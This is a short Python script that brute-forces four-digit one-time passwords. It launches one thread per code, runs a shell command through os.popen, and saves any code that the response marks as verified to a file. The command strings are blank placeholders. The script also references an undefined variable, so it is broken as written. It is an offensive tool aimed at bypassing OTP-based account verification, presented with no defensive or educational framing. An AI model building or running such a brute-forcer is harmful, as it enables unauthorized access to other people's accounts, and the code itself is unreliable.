import os
import threading

def otp(num):
    s1 = str(""" """)
    s2 = str(""" """)
    num = str(num)
    rd = os.popen(s1+num+s2).read()
    strin = str(rd)
    print (rd.lower()+" "+ num)
    result = strin.find("OTP Verification Successful")
    #result2 = strin.find("Verification Successful")  #For Anonymous Account
    if result2 != -1 :
        print("Found")
        print(num)
        print(rd)
        OTP = open("ower.txt","w+")
        OTP.write("OTP is : " + num)
        

if __name__ == "__main__":
    #for i in range(1000,1600):
    #for i in range(1600,2200):
    #for i in range(2200,2800):
    #for i in range(2800,3400):
    #for i in range(3400,4000):
    #for i in range(4000,4600):
    #for i in range(4600,5200):
    #for i in range(5200,5800):
    #for i in range(5800,6400):
    #for i in range(6400,7000):
    #for i in range(7000,7600):
    #for i in range(7600,8200):
    #for i in range(8200,8800):
    #for i in range(8800,9400):
    for i in range(9400,9999):
        t = threading.Thread(target=otp, args=(i,))
        t.start()
